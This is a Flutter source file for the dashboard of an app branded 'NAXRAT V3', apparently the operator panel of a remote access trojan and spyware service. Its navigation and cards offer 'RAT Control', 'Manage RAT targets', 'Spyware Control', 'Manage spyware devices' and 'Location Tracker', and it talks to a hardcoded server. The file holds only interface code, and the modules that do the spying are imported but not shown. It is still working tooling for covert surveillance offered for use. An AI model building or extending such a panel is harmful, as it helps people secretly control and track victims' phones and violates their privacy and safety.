// ==================== DASHBOARD_PAGE.DART ====================
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'dart:async';
import 'package:url_launcher/url_launcher.dart';
import 'package:video_player/video_player.dart';
import 'dart:ui';

import 'login_page.dart';
import 'device_dashboard.dart';
import 'spyware.dart';

// Server Utama untuk Login & Dashboard (PORT 3000)
const String MAIN_SERVER_URL = "http://gunturhosting.hoshino.my.id:3000";

class DashboardPage extends StatefulWidget {
  final String username;
  final String password;
  final String role;
  final String sessionKey;

  const DashboardPage({
    super.key,
    required this.username,
    required this.password,
    required this.role,
    required this.sessionKey,
  });

  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage> with SingleTickerProviderStateMixin {
  int _selectedIndex = 0;
  late AnimationController _animationController;
  late Animation<double> _fadeAnimation;
  
  late VideoPlayerController _videoController;
  bool _isVideoInitialized = false;
  
  final Color primaryRed = const Color(0xFFE53935);
  final Color darkRed = const Color(0xFFB71C1C);
  final Color darkBg = const Color(0xFF0A0A0A);
  final Color cardBg = const Color(0xFF1E1E1E);
  final Color textWhite = const Color(0xFFFFFFFF);
  final Color textGray = const Color(0xFF9E9E9E);
  
  List<dynamic> _news = [];
  bool _isLoadingNews = true;

  late List<Widget> _pages;
  late List<String> _pageTitles;

  @override
  void initState() {
    super.initState();
    
    // Initialize video background untuk welcome card
    _videoController = VideoPlayerController.asset('assets/videos/bnb.mp4')
      ..initialize().then((_) {
        setState(() {
          _isVideoInitialized = true;
        });
        _videoController.setLooping(true);
        _videoController.setVolume(0.0);
        _videoController.play();
      }).catchError((e) {
        setState(() {
          _isVideoInitialized = true;
        });
      });
    
    _animationController = AnimationController(
      duration: const Duration(milliseconds: 300),
      vsync: this,
    );
    _fadeAnimation = CurvedAnimation(
      parent: _animationController,
      curve: Curves.easeInOut,
    );
    _animationController.forward();
    
    _fetchNews();
    
    // PAGES: Dashboard, RAT Controller, Spyware, Profile
    _pages = [
      _buildHomePage(),
      const DeviceDashboardPage(),
      SpywarePage(
        sessionKey: widget.sessionKey,
        username: widget.username,
      ),
      _buildProfilePage(),
    ];
    
    _pageTitles = [
      "Dashboard",
      "RAT Control",
      "Spyware",
      "Profile",
    ];
  }

  @override
  void dispose() {
    _videoController.dispose();
    _animationController.dispose();
    super.dispose();
  }

  Future<void> _fetchNews() async {
    try {
      final response = await http.get(
        Uri.parse("$MAIN_SERVER_URL/api/news/list"),
      ).timeout(const Duration(seconds: 10));
      
      if (response.statusCode == 200) {
        setState(() {
          _news = jsonDecode(response.body);
          _isLoadingNews = false;
        });
      } else {
        setState(() => _isLoadingNews = false);
      }
    } catch (e) {
      setState(() => _isLoadingNews = false);
    }
  }

  void _onNavTap(int index) {
    setState(() {
      _selectedIndex = index;
      _animationController.reset();
      _animationController.forward();
    });
  }

  void _logout() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.clear();
    if (mounted) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => const LoginPage()),
      );
    }
  }

  Widget _buildHomePage() {
    return RefreshIndicator(
      color: primaryRed,
      onRefresh: _fetchNews,
      child: SingleChildScrollView(
        physics: const AlwaysScrollableScrollPhysics(),
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Welcome Card with Video Background
            ClipRRect(
              borderRadius: BorderRadius.circular(24),
              child: Stack(
                children: [
                  // Video Background
                  if (_isVideoInitialized && _videoController.value.isInitialized)
                    SizedBox(
                      height: 220,
                      width: double.infinity,
                      child: VideoPlayer(_videoController),
                    )
                  else
                    Container(
                      height: 220,
                      width: double.infinity,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [darkRed, primaryRed],
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                        ),
                      ),
                    ),
                  
                  // Dark Overlay
                  Container(
                    height: 220,
                    width: double.infinity,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [
                          Colors.black.withOpacity(0.7),
                          Colors.black.withOpacity(0.5),
                          Colors.transparent,
                        ],
                        begin: Alignment.bottomLeft,
                        end: Alignment.topRight,
                      ),
                    ),
                  ),
                  
                  // Glassmorphism Overlay
                  Container(
                    height: 220,
                    width: double.infinity,
                    child: BackdropFilter(
                      filter: ImageFilter.blur(sigmaX: 2, sigmaY: 2),
                      child: Container(
                        color: Colors.black.withOpacity(0.3),
                      ),
                    ),
                  ),
                  
                  // Content
                  Container(
                    height: 220,
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Row(
                          children: [
                            Container(
                              padding: const EdgeInsets.all(10),
                              decoration: BoxDecoration(
                                color: Colors.white.withOpacity(0.2),
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(
                                  color: primaryRed.withOpacity(0.5),
                                  width: 1,
                                ),
                              ),
                              child: const Icon(Icons.bolt, color: Colors.white, size: 24),
                            ),
                            const Spacer(),
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                              decoration: BoxDecoration(
                                color: primaryRed.withOpacity(0.8),
                                borderRadius: BorderRadius.circular(20),
                                boxShadow: [
                                  BoxShadow(
                                    color: primaryRed.withOpacity(0.5),
                                    blurRadius: 10,
                                  ),
                                ],
                              ),
                              child: Text(
                                widget.role.toUpperCase(),
                                style: const TextStyle(
                                  color: Colors.white,
                                  fontSize: 10,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1,
                                ),
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 20),
                        Text(
                          "Welcome back,",
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.9),
                            fontSize: 14,
                            letterSpacing: 1,
                          ),
                        ),
                        const SizedBox(height: 4),
                        ShaderMask(
                          shaderCallback: (bounds) => LinearGradient(
                            colors: [Colors.white, primaryRed],
                            begin: Alignment.centerLeft,
                            end: Alignment.centerRight,
                          ).createShader(bounds),
                          child: Text(
                            widget.username,
                            style: const TextStyle(
                              color: Colors.white,
                              fontSize: 28,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 1,
                            ),
                          ),
                        ),
                        const SizedBox(height: 16),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                          decoration: BoxDecoration(
                            color: Colors.black.withOpacity(0.5),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                              color: primaryRed.withOpacity(0.5),
                              width: 1,
                            ),
                          ),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              const Icon(Icons.vpn_key, color: Colors.white, size: 14),
                              const SizedBox(width: 6),
                              Text(
                                "Key: ${widget.sessionKey.substring(0, 12)}...",
                                style: const TextStyle(
                                  color: Colors.white,
                                  fontSize: 11,
                                  fontFamily: 'monospace',
                                ),
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
            
            const SizedBox(height: 24),
            
            // Stats Cards
            Row(
              children: [
                Expanded(
                  child: _buildStatCard(
                    icon: Icons.phone_android,
                    title: "RAT Controller",
                    value: "Active",
                    color: primaryRed,
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: _buildStatCard(
                    icon: Icons.security,
                    title: "Spyware",
                    value: "Ready",
                    color: const Color(0xFF9C27B0),
                  ),
                ),
              ],
            ),
            
            const SizedBox(height: 24),
            
            // Quick Menu Section
            const Text(
              "Quick Access",
              style: TextStyle(
                color: Colors.white,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            
            GridView.count(
              shrinkWrap: true,
              physics: const NeverScrollableScrollPhysics(),
              crossAxisCount: 2,
              mainAxisSpacing: 12,
              crossAxisSpacing: 12,
              childAspectRatio: 1.2,
              children: [
                _buildQuickMenuCard(
                  icon: Icons.phone_android,
                  title: "RAT Control",
                  subtitle: "Manage RAT targets",
                  color: primaryRed,
                  index: 1,
                ),
                _buildQuickMenuCard(
                  icon: Icons.security,
                  title: "Spyware Control",
                  subtitle: "Manage spyware devices",
                  color: const Color(0xFF9C27B0),
                  index: 2,
                ),
                _buildQuickMenuCard(
                  icon: Icons.location_on,
                  title: "Location Tracker",
                  subtitle: "Track all devices",
                  color: const Color(0xFF2196F3),
                  index: 2,
                ),
                _buildQuickMenuCard(
                  icon: Icons.person,
                  title: "My Profile",
                  subtitle: "Account settings",
                  color: const Color(0xFF4CAF50),
                  index: 3,
                ),
              ],
            ),
            
            const SizedBox(height: 24),
            
            // News Section
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: cardBg,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: primaryRed.withOpacity(0.2)),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Row(
                    children: [
                      Icon(Icons.newspaper, color: Color(0xFFE53935), size: 18),
                      SizedBox(width: 8),
                      Text(
                        "Latest News",
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 14,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),
                  if (_isLoadingNews)
                    const Center(
                      child: Padding(
                        padding: EdgeInsets.all(20),
                        child: CircularProgressIndicator(color: Color(0xFFE53935)),
                      ),
                    )
                  else if (_news.isEmpty)
                    Padding(
                      padding: const EdgeInsets.all(20),
                      child: Center(
                        child: Text(
                          "No news available",
                          style: TextStyle(color: textGray),
                        ),
                      ),
                    )
                  else
                    ...(_news.take(3).map((item) => _buildNewsItem(item)).toList()),
                ],
              ),
            ),
            
            const SizedBox(height: 30),
          ],
        ),
      ),
    );
  }

  Widget _buildStatCard({
    required IconData icon,
    required String title,
    required String value,
    required Color color,
  }) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: color.withOpacity(0.3)),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: color.withOpacity(0.2),
              borderRadius: BorderRadius.circular(10),
            ),
            child: Icon(icon, color: color, size: 20),
          ),
          const SizedBox(width: 12),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                value,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                ),
              ),
              Text(
                title,
                style: TextStyle(
                  color: textGray,
                  fontSize: 11,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildQuickMenuCard({
    required IconData icon,
    required String title,
    required String subtitle,
    required Color color,
    required int index,
  }) {
    return GestureDetector(
      onTap: () => _onNavTap(index),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: cardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: color.withOpacity(0.3)),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: color.withOpacity(0.2),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Icon(icon, color: color, size: 22),
            ),
            const Spacer(),
            Text(
              title,
              style: const TextStyle(
                color: Colors.white,
                fontSize: 14,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 2),
            Text(
              subtitle,
              style: TextStyle(
                color: textGray,
                fontSize: 10,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildNewsItem(Map<String, dynamic> news) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 12),
      child: Container(
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: darkBg,
          borderRadius: BorderRadius.circular(12),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              news['title'] ?? "No Title",
              style: const TextStyle(
                color: Colors.white,
                fontSize: 14,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              news['desc'] ?? "No Description",
              style: TextStyle(
                color: textGray,
                fontSize: 12,
              ),
              maxLines: 2,
            ),
            const SizedBox(height: 8),
            Text(
              _formatDate(news['date']),
              style: TextStyle(
                color: textGray.withOpacity(0.5),
                fontSize: 10,
              ),
            ),
          ],
        ),
      ),
    );
  }

  String _formatDate(String? dateString) {
    if (dateString == null) return "";
    try {
      final date = DateTime.parse(dateString);
      return "${date.day}/${date.month}/${date.year}";
    } catch (e) {
      return "";
    }
  }

  Widget _buildProfilePage() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(
        children: [
          const SizedBox(height: 20),
          Center(
            child: Stack(
              children: [
                Container(
                  width: 100,
                  height: 100,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    gradient: LinearGradient(
                      colors: [darkRed, primaryRed],
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: primaryRed.withOpacity(0.4),
                        blurRadius: 20,
                      ),
                    ],
                  ),
                  child: const Center(
                    child: Icon(
                      Icons.person,
                      color: Colors.white,
                      size: 50,
                    ),
                  ),
                ),
                Positioned(
                  bottom: 0,
                  right: 0,
                  child: Container(
                    padding: const EdgeInsets.all(4),
                    decoration: BoxDecoration(
                      color: primaryRed,
                      shape: BoxShape.circle,
                      border: Border.all(color: darkBg, width: 2),
                    ),
                    child: const Icon(
                      Icons.edit,
                      color: Colors.white,
                      size: 14,
                    ),
                  ),
                ),
              ],
            ),
          ),
          const SizedBox(height: 16),
          Text(
            widget.username,
            style: TextStyle(
              color: textWhite,
              fontSize: 24,
              fontWeight: FontWeight.bold,
            ),
          ),
          const SizedBox(height: 4),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
            decoration: BoxDecoration(
              color: primaryRed.withOpacity(0.2),
              borderRadius: BorderRadius.circular(20),
            ),
            child: Text(
              widget.role,
              style: TextStyle(
                color: primaryRed,
                fontSize: 12,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
          const SizedBox(height: 32),
          Container(
            decoration: BoxDecoration(
              color: cardBg,
              borderRadius: BorderRadius.circular(20),
            ),
            child: Column(
              children: [
                _buildProfileMenuItem(
                  icon: Icons.person,
                  title: "Username",
                  value: widget.username,
                ),
                _buildProfileMenuItem(
                  icon: Icons.security,
                  title: "Role",
                  value: widget.role,
                ),
                _buildProfileMenuItem(
                  icon: Icons.vpn_key,
                  title: "Session Key",
                  value: widget.sessionKey,
                  isKey: true,
                ),
              ],
            ),
          ),
          const SizedBox(height: 24),
          SizedBox(
            width: double.infinity,
            child: ElevatedButton.icon(
              onPressed: _logout,
              icon: const Icon(Icons.logout),
              label: const Text("LOGOUT"),
              style: ElevatedButton.styleFrom(
                backgroundColor: primaryRed,
                padding: const EdgeInsets.symmetric(vertical: 15),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
              ),
            ),
          ),
          const SizedBox(height: 20),
          Text(
            "NAXRAT V3 | @chgunturx",
            style: TextStyle(
              color: textGray.withOpacity(0.3),
              fontSize: 10,
            ),
          ),
          const SizedBox(height: 20),
        ],
      ),
    );
  }

  Widget _buildProfileMenuItem({
    required IconData icon,
    required String title,
    required String value,
    bool isKey = false,
  }) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        border: Border(
          bottom: BorderSide(color: textGray.withOpacity(0.1)),
        ),
      ),
      child: Row(
        children: [
          Icon(icon, color: primaryRed, size: 20),
          const SizedBox(width: 16),
          Text(
            "$title:",
            style: TextStyle(
              color: textGray,
              fontSize: 14,
            ),
          ),
          const Spacer(),
          Text(
            isKey ? "${value.substring(0, 12)}..." : value,
            style: TextStyle(
              color: textWhite,
              fontSize: 14,
              fontWeight: FontWeight.w500,
            ),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: darkBg,
      body: FadeTransition(
        opacity: _fadeAnimation,
        child: _pages[_selectedIndex],
      ),
      bottomNavigationBar: Container(
        decoration: BoxDecoration(
          color: cardBg,
          border: Border(
            top: BorderSide(color: primaryRed.withOpacity(0.3), width: 1),
          ),
        ),
        child: BottomNavigationBar(
          currentIndex: _selectedIndex,
          onTap: _onNavTap,
          type: BottomNavigationBarType.fixed,
          backgroundColor: cardBg,
          selectedItemColor: primaryRed,
          unselectedItemColor: textGray,
          selectedLabelStyle: const TextStyle(fontSize: 12, fontWeight: FontWeight.bold),
          items: const [
            BottomNavigationBarItem(
              icon: Icon(Icons.home),
              label: "Home",
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.phone_android),
              label: "RAT",
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.security),
              label: "Spyware",
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.person),
              label: "Profile",
            ),
          ],
        ),
      ),
    );
  }
}